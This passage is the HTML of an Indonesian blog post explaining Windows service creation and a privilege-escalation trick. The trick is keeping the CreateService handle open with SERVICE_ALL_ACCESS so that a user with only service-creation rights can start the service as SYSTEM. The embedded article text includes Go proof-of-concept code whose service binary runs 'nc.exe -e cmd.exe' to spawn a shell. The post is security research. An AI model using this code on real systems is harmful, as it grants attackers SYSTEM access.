<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>Windows Services: Start a Service During Its Creation [ID] | Ef's log</title><meta name=keywords content><meta name=description content="Eksplorasi Windows Service"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="Windows Services: Start a Service During Its Creation [ID]"><meta property="og:description" content="Eksplorasi Windows Service"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/"><meta property="article:section" content="blog"><meta property="article:published_time" content="2021-08-12T22:04:18+07:00"><meta property="article:modified_time" content="2021-08-12T22:04:18+07:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Windows Services: Start a Service During Its Creation [ID]"><meta name=twitter:description content="Eksplorasi Windows Service"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://fahmifj.github.io/blog/"},{"@type":"ListItem","position":2,"name":"Windows Services: Start a Service During Its Creation [ID]","item":"https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Windows Services: Start a Service During Its Creation [ID]","name":"Windows Services: Start a Service During Its Creation [ID]","description":"Eksplorasi Windows Service","keywords":[""],"articleBody":"Tahun lalu (ternyata udah setahun), saya sempat baca dua buah postingan blog yang membahas tentang Windows Service. Postingan pertama adalah “beyond root” dari mesin Resolute dari Hack The Box yang ditulis oleh 0xdf dan yang kedua adalah postingan yang ditulis oleh VbScrub. Kedua postingan tersebut dapat dibaca ditautan berikut:\nhttps://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html\nhttps://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/\nDi postingan pertama, 0xdf lebih membahas tentang psexec-nya Impacket dan tool serupa lainnya (teknikal), sedangkan di postingan kedua, VbScrub melanjutkan kulikan1nya-nya 0xdf dan lebih membahas tentang Windows service-nya.\nBerkat kedua postingan tersebut, saya jadi tertarik juga untuk ngulik dan nyelam ke dokumentasi API Windows service.\nSekilas definisi, service sederhananya service adalah suatu program yang berjalan di belakang layar. Untuk Linux/Unix-like, biasanya disebut Daemon. Contohnya: Windows Update, Firewall, Audio processing seperti Realtek misalnya, dll.\nSumber colongan tertera Creation of a Service Pada Windows, sebuah service dapat dibuat dengan menggunakan command-line utility bawaan Windows bernama sc.exe. Berikut contoh penggunaannya.\nC:\\\u003e sc.exe create MyService binPath=\"C:\\program.exe\" MyService = Nama service binPath = Lokasi executable program (+ argument) Kedua argumen diatas wajib disuplai (minimal).\nPembuatan service MyService akan berhasil jika perintah tersebut jalankan pada elevated (admin) terminal , atau user yang menjalankannya memiliki hak membuat service (SC_MANAGER_CREATE_SERVICE).\nC:\\Users\\fahmi\u003esc create MyService binPath=\"C:\\myservice\\nc.exe\" [SC] CreateService SUCCESS Jika bukan elevated atau tanpa hak untuk membuat service, maka hasil yang diberikan oleh sc.exe adalah pesan “Access is denied”.\nC:\\Users\\fahmi\u003esc.exe create MyService binPath=\"C:\\myservice\\nc.exe\" [SC] OpenSCManager FAILED 5: Access is denied. Sedangkan untuk mengetahui tahap pembuatan/instalasi sebuah service, kita bisa mengacu kepada contoh kode bahasa C dari dokumentasi Microsoft berikut.\nVOID SvcInstall() { SC_HANDLE schSCManager; SC_HANDLE schService; TCHAR szPath[MAX_PATH]; if( !GetModuleFileName( \"\", szPath, MAX_PATH ) ) { printf(\"Cannot install service (%d)\\n\", GetLastError()); return; } // Creation of a Service: STEP 1 // Get a handle to the SCM database. schSCManager = OpenSCManager( NULL, // local computer NULL, // ServicesActive database SC_MANAGER_ALL_ACCESS); // full access rights if (NULL == schSCManager) { printf(\"OpenSCManager failed (%d)\\n\", GetLastError()); return; } // Creation of a Service: STEP 2 // Create the service schService = CreateService( schSCManager, // SCM database SVCNAME, // name of service SVCNAME, // service name to display SERVICE_ALL_ACCESS, // desired access SERVICE_WIN32_OWN_PROCESS, // service type SERVICE_DEMAND_START, // start type SERVICE_ERROR_NORMAL, // error control type szPath, // path to service's binary NULL, // no load ordering group NULL, // no tag identifier NULL, // no dependencies NULL, // LocalSystem account NULL); // no password if (schService == NULL) { printf(\"CreateService failed (%d)\\n\", GetLastError()); CloseServiceHandle(schSCManager); return; } else printf(\"Service installed successfully\\n\"); // Creation of a Service: STEP 3 CloseServiceHandle(schService); CloseServiceHandle(schSCManager); } Secara garis besar, tahap pembuatan service adalah seperti berikut:\nProgram membuat koneksi ke Service Control Manager (SCM) dengan memanggil fungsi OpenSCManager. Fungsi ini mengembalikan sesuatu (return value) yang disebut handle (selanjutnya disebut handle SCM). Handle SCM ini memegang level akses tertentu terhadap SCM, detailnya bisa dilihat disini. Handle SCM bersama dengan argumen lainnya yang disuplai seperti “nama service” dan “binPath” akan di-passing ke fungsi CreateService() untuk membuat service. Fungsi CreateService() ini memiliki return value berupa handle (kita sebut handle SVC) dengan level akses tertentu juga, detailnya bisa dilihat disini. Di tahap ini, pesan sukses ditampilkan, lalu handle SCM dan handle SVC ditutup dan program keluar. SCM sederhananya dapat dianggap sebagai database dari service. Handle SCM menentukan apakah kita dapat melakukan read/write access pada SCM dan handle SVC menentukan apakah kita dapat mengontrol suatu service. Didapatkannya handle SVC sendiri bergantung pada level akses handle SCM. Pada potongan kode sebelumnya akses handle SCM adalah SC_MANAGER_ALL_ACCESS, yang mana bisa diasumsikan bahwa hal ini memerlukan elevated process. Sedangkan berdasarkan kasus mesin Resolute yang diulas oleh 0xdf, handle SCM dengan akses SC_MANAGER_CREATE_SERVICE pun sudah cukup untuk membuat service.\nStarting a Service Masih dengan tool yang sama (sc.exe), sebuah service dapat di jalankan dengan perintah berikut.\nC:\\\u003esc start MyService Normalnya, service yang berhasil dibuat oleh user menggunakan sc.exe dalam mode elevated atau user dengan hak SC_MANAGER_CREATE_SERVICE tidak akan bisa dikontrol (start, stop) oleh regular user.\nC:\\Users\\fahmi\u003esc create MyService binPath=\"C:\\myservice\\nc.exe\" [SC] CreateService SUCCESS C:\\Users\\fahmi\u003esc start MyService [SC] StartService: OpenService FAILED 5: Access is denied. Pada contoh diatas, pembuatan service berhasil karena user fahmi memiliki hak SC_MANAGER_CREATE_SERVICE, tetapi tidak memiliki kontrol atas service yang dibuatnya.\nJika melihat dokumentasi Microsoft, yang juga dalam bahasa C, tahapan menjalankan sebuah service tanpa sc.exe secara garis besarnya adalah seperti berikut:\nMembuat koneksi ke SCM database dan mendapatkan handle SCM dengan level akses tertentu Handle SCM kemudian di-passing ke fungsi OpenService(). Fungsi ini mengembalikan handle SVC dengan level akses tertentu. Handle SVC yang didapat dipassing ke StartService untuk mulai menjalankan service. Dari ketiga tahap menjalankan service tersebut, regular user tentunya akan mendapat galat berupa “Access is denied” di tahap 2 karena handle SVC tidak didapatkan dan handle SCMnya hanya sebatas level user.\nDon’t Close the Handles! Kalau kita lihat kembali ke proses pembuatan service, tepatnya pada tahap 2 fungsi CreateSevice() dipanggil, ternyata si pembuat service (level admin atau user dengan hak SC_MANAGER_CREATE_SERVICE) bisa menentukan level akses dirinya terhadap service yang dibuat dan handle SVC yang dikembalikan oleh fungsi tersebut akan memiliki level akses yang sama.\nJadi, jika saat pembuatan service A, level akses yang disuplai adalah SERVICE_ALL_ACCESS (full kontrol), maka handle SVC A pun akan memiliki level akses yang sama terhadap Service A, yaitu full kontrol. Sayangnya handle SVC A ini ditutup berbarengan dengan handle SCM (tahap 3 pembuatan service).\nLalu, kira-kira apa jadinya jika handle SVC A tersebut tidak ditutup seperti seharusnya, melainkan dilanjut dan disuplai ke fungsi StartService? Hal inilah yang ditemukan oleh 0xdf dan VbScrub!\nUntuk mencoba hal tersebut tentunya kita perlu membuat custom program dahulu dan berikut adalah program yang saya tulis dalam bahasa Go (Programnya versi argumen, bisa di cek disini).\npackage main import \"golang.org/x/sys/windows\" func main() { // Creation of a Service: STEP 1 // Connect to scm to get a handle to create a service scmHandle, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CREATE_SERVICE) if err != nil { fmt.Print(\"Error cannot create a service\", err) os.Exit(-1) } // define service serviceName, _ := windows.UTF16PtrFromString(\"MyService\") serviceExecPath, _ := windows.UTF16PtrFromString(`C:\\myservice\\nc.exe -e cmd.exe localhost 9000`) // Creation of a ervice: STEP 2 // Create a service svcHandle, err := windows.CreateService( scmHandle, // SCM database serviceName, // name of service nil, // service name to display windows.SERVICE_ALL_ACCESS, // desired access windows.SERVICE_WIN32_OWN_PROCESS, // service type windows.SERVICE_DEMAND_START, // start type windows.SERVICE_ERROR_NORMAL, // error control type serviceExecPath, // path to service's binary nil, // no load ordering group nil, // no tag identifier nil, // no dependencies nil, // LocalSystem account nil, // no password ) if err != nil { fmt.Print(\"err\", err) os.Exit(-1) } // Creation of a Service: STEP 3 // Don't close the svcHandle, instead send it to StartService if windows.StartService(svcHandle, 0, nil); err != nil { fmt.Print(\"Error Starting service\", err) os.Exit(-1) } // Creation of a Service: STEP 4 // Finally close the handles windows.CloseServiceHandle(svcHandle) windows.CloseHandle(scmHandle) } VbScrub sendiri sebelumnya telah menuliskan kode untuk mendemonstrasikan hal ini, bisa dilihat disini.\nHasilnya?\nSYSTEM!*\n*Perlu diingat user yang menjalankan program sudah perlu hak akses SC_MANAGER_CREATE_SERVICE.\nTapi, kenapa harus custom code?\nKarena sc.exe sendiri tidak menyediakan opsi untuk meng-assign SERVICE_ALL_ACCESS pada service yang akan dibuat. Ditambah, setelah proses pembuatan service, handle-handlenya ditutup.\nC:\\Users\\fahmi\u003esc create DESCRIPTION: Creates a service entry in the registry and Service Database. USAGE: sc create [service name] [binPath= ] ... OPTIONS: NOTE: The option name includes the equal sign. A space is required between the equal sign and the value. type= ","wordCount":"1367","inLanguage":"en","datePublished":"2021-08-12T22:04:18+07:00","dateModified":"2021-08-12T22:04:18+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/blog/>Blog</a></div><h1 class=post-title>Windows Services: Start a Service During Its Creation [ID]</h1><p class=post-description>Eksplorasi Windows Service</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>August 12, 2021
</span>&nbsp;&#183;&nbsp;<span class=meta-read>7 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/windows-internal/>Windows Internal</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#creation-of-a-service aria-label="Creation of a Service">Creation of a Service</a></li><li><a href=#starting-a-service aria-label="Starting a Service">Starting a Service</a></li><li><a href=#dont-close-the-handles aria-label="Don&amp;rsquo;t Close the Handles!">Don&rsquo;t Close the Handles!</a></li><li><a href=#conclusion aria-label=Conclusion>Conclusion</a></li></ul></div></aside><div class=post-content><p>Tahun lalu (ternyata udah setahun), saya sempat baca dua buah postingan blog yang membahas tentang Windows Service. Postingan pertama adalah &ldquo;beyond root&rdquo; dari mesin Resolute dari Hack The Box yang ditulis oleh <a href=https://twitter.com/0xdf_>0xdf</a> dan yang kedua adalah postingan yang ditulis oleh <a href=https://twitter.com/VbScrub>VbScrub</a>. Kedua postingan tersebut dapat dibaca ditautan berikut:</p><ul><li><p><a href=https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html>https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html</a></p></li><li><p><a href=https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/>https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/</a></p></li></ul><p>Di postingan pertama, 0xdf lebih membahas tentang <code>psexec</code>-nya Impacket dan tool serupa lainnya (teknikal), sedangkan di postingan kedua, VbScrub melanjutkan <em>kulikan<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>nya</em>-nya 0xdf dan lebih membahas tentang Windows service-nya.</p><p>Berkat kedua postingan tersebut, saya jadi tertarik juga untuk ngulik dan nyelam ke dokumentasi API Windows service.</p><p>Sekilas definisi, service sederhananya service adalah suatu program yang berjalan di belakang layar. Untuk Linux/Unix-like, biasanya disebut Daemon. Contohnya: Windows Update, Firewall, Audio processing seperti Realtek misalnya, dll.</p><p><div class=img-container><img src=imgs/image-20210812024145951.png alt=image-20210812024145951></div></p><div class=force-center><small>Sumber colongan tertera</small></div><h2 id=creation-of-a-service>Creation of a Service<a class=anchor aria-hidden=true href=#creation-of-a-service>#</a></h2><p>Pada Windows, sebuah service dapat dibuat dengan menggunakan command-line utility bawaan Windows bernama <code>sc.exe</code>. Berikut contoh penggunaannya.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>C:<span class=se>\&gt;</span> sc.exe create MyService <span class=nv>binPath</span><span class=o>=</span><span class=s2>&#34;C:\program.exe&#34;</span>
</span></span></code></pre></div><ul><li>MyService = Nama service</li><li>binPath = Lokasi executable program (+ argument)</li></ul><p>Kedua argumen diatas wajib disuplai (minimal).</p><p>Pembuatan service <code>MyService</code> akan berhasil jika perintah tersebut jalankan pada elevated (admin) terminal , atau user yang menjalankannya memiliki hak membuat service (<code>SC_MANAGER_CREATE_SERVICE</code>).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\f</span>ahmi&gt;sc create MyService <span class=nv>binPath</span><span class=o>=</span><span class=s2>&#34;C:\myservice\nc.exe&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>SC<span class=o>]</span> CreateService SUCCESS
</span></span></code></pre></div><p>Jika bukan elevated atau tanpa hak untuk membuat service, maka hasil yang diberikan oleh <code>sc.exe</code> adalah pesan &ldquo;Access is denied&rdquo;.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\f</span>ahmi&gt;sc.exe create MyService <span class=nv>binPath</span><span class=o>=</span><span class=s2>&#34;C:\myservice\nc.exe&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>SC<span class=o>]</span> OpenSCManager FAILED 5:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Access is denied.
</span></span></code></pre></div><p>Sedangkan untuk mengetahui tahap pembuatan/instalasi sebuah service, kita bisa mengacu kepada contoh kode bahasa C dari <a href=https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service>dokumentasi Microsoft</a> berikut.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>VOID</span> <span class=nf>SvcInstall</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>SC_HANDLE</span> <span class=n>schSCManager</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>SC_HANDLE</span> <span class=n>schService</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>TCHAR</span> <span class=n>szPath</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span> <span class=o>!</span><span class=n>GetModuleFileName</span><span class=p>(</span> <span class=s>&#34;&#34;</span><span class=p>,</span> <span class=n>szPath</span><span class=p>,</span> <span class=n>MAX_PATH</span> <span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Cannot install service (%d)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>     <span class=c1>// Creation of a Service: STEP 1
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Get a handle to the SCM database.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>schSCManager</span> <span class=o>=</span> <span class=n>OpenSCManager</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span>                    <span class=c1>// local computer
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>NULL</span><span class=p>,</span>                    <span class=c1>// ServicesActive database
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>SC_MANAGER_ALL_ACCESS</span><span class=p>);</span>  <span class=c1>// full access rights
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>NULL</span> <span class=o>==</span> <span class=n>schSCManager</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;OpenSCManager failed (%d)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>     <span class=c1>// Creation of a Service: STEP 2
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Create the service
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>schService</span> <span class=o>=</span> <span class=n>CreateService</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>schSCManager</span><span class=p>,</span>              <span class=c1>// SCM database
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>SVCNAME</span><span class=p>,</span>                   <span class=c1>// name of service
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>SVCNAME</span><span class=p>,</span>                   <span class=c1>// service name to display
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>SERVICE_ALL_ACCESS</span><span class=p>,</span>        <span class=c1>// desired access
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>SERVICE_WIN32_OWN_PROCESS</span><span class=p>,</span> <span class=c1>// service type
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>SERVICE_DEMAND_START</span><span class=p>,</span>      <span class=c1>// start type
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>SERVICE_ERROR_NORMAL</span><span class=p>,</span>      <span class=c1>// error control type
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>szPath</span><span class=p>,</span>                    <span class=c1>// path to service&#39;s binary
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>NULL</span><span class=p>,</span>                      <span class=c1>// no load ordering group
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>NULL</span><span class=p>,</span>                      <span class=c1>// no tag identifier
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>NULL</span><span class=p>,</span>                      <span class=c1>// no dependencies
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>NULL</span><span class=p>,</span>                      <span class=c1>// LocalSystem account
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>NULL</span><span class=p>);</span>                     <span class=c1>// no password
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>schService</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;CreateService failed (%d)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>CloseServiceHandle</span><span class=p>(</span><span class=n>schSCManager</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Service installed successfully</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Creation of a Service: STEP 3
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>CloseServiceHandle</span><span class=p>(</span><span class=n>schService</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>CloseServiceHandle</span><span class=p>(</span><span class=n>schSCManager</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Secara garis besar, tahap pembuatan service adalah seperti berikut:</p><ol><li>Program membuat koneksi ke Service Control Manager (SCM) dengan memanggil fungsi <a href=https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw>OpenSCManager</a>. Fungsi ini mengembalikan sesuatu (return value) yang disebut <strong>handle</strong> (selanjutnya disebut <a href=https://docs.microsoft.com/en-us/windows/win32/services/scm-handles>handle SCM</a>). Handle SCM ini memegang level akses tertentu terhadap SCM, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-the-service-control-manager">disini</a>.</li><li>Handle SCM bersama dengan argumen lainnya yang disuplai seperti &ldquo;nama service&rdquo; dan &ldquo;binPath&rdquo; akan di-passing ke fungsi <a href=https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew>CreateService()</a> untuk membuat service. Fungsi <code>CreateService()</code> ini memiliki return value berupa <strong>handle</strong> (kita sebut handle SVC) dengan level akses tertentu juga, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-a-service">disini</a>.</li><li>Di tahap ini, pesan sukses ditampilkan, lalu handle SCM dan handle SVC <u>ditutup</u> dan program keluar.</li></ol><blockquote><ul><li>SCM sederhananya dapat dianggap sebagai database dari service.</li><li>Handle SCM menentukan apakah kita dapat melakukan read/write access pada SCM dan handle SVC menentukan apakah kita dapat mengontrol suatu service. Didapatkannya handle SVC sendiri bergantung pada level akses handle SCM.</li></ul></blockquote><p>Pada potongan kode sebelumnya akses handle SCM adalah <code>SC_MANAGER_ALL_ACCESS</code>, yang mana bisa diasumsikan bahwa hal ini memerlukan elevated process. Sedangkan berdasarkan kasus mesin Resolute yang diulas oleh 0xdf, handle SCM dengan akses <code>SC_MANAGER_CREATE_SERVICE</code> pun sudah cukup untuk membuat service.</p><h2 id=starting-a-service>Starting a Service<a class=anchor aria-hidden=true href=#starting-a-service>#</a></h2><p>Masih dengan tool yang sama (<code>sc.exe</code>), sebuah service dapat di jalankan dengan perintah berikut.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>C:<span class=se>\&gt;</span>sc start MyService
</span></span></code></pre></div><p>Normalnya, service yang berhasil dibuat oleh user menggunakan <code>sc.exe</code> dalam mode elevated atau user dengan hak <code>SC_MANAGER_CREATE_SERVICE</code> tidak akan bisa dikontrol (start, stop) oleh <u>regular user</u>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\f</span>ahmi&gt;sc create MyService <span class=nv>binPath</span><span class=o>=</span><span class=s2>&#34;C:\myservice\nc.exe&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>SC<span class=o>]</span> CreateService SUCCESS
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\f</span>ahmi&gt;sc start MyService
</span></span><span class=line><span class=cl><span class=o>[</span>SC<span class=o>]</span> StartService: OpenService FAILED 5:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Access is denied.
</span></span></code></pre></div><p>Pada contoh diatas, pembuatan service berhasil karena user <code>fahmi</code> memiliki hak <code>SC_MANAGER_CREATE_SERVICE</code>, tetapi tidak memiliki kontrol atas service yang dibuatnya.</p><p>Jika melihat <a href=https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service>dokumentasi</a> Microsoft, yang juga dalam bahasa C, tahapan menjalankan sebuah service tanpa <code>sc.exe</code> secara garis besarnya adalah seperti berikut:</p><ol><li>Membuat koneksi ke SCM database dan mendapatkan handle SCM dengan level akses tertentu</li><li>Handle SCM kemudian di-passing ke fungsi <a href=https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew>OpenService()</a>. Fungsi ini mengembalikan handle SVC dengan level akses tertentu.</li><li>Handle SVC yang didapat dipassing ke <a href=https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew>StartService</a> untuk mulai menjalankan service.</li></ol><p>Dari ketiga tahap menjalankan service tersebut, regular user tentunya akan mendapat galat berupa &ldquo;Access is denied&rdquo; di tahap 2 karena handle 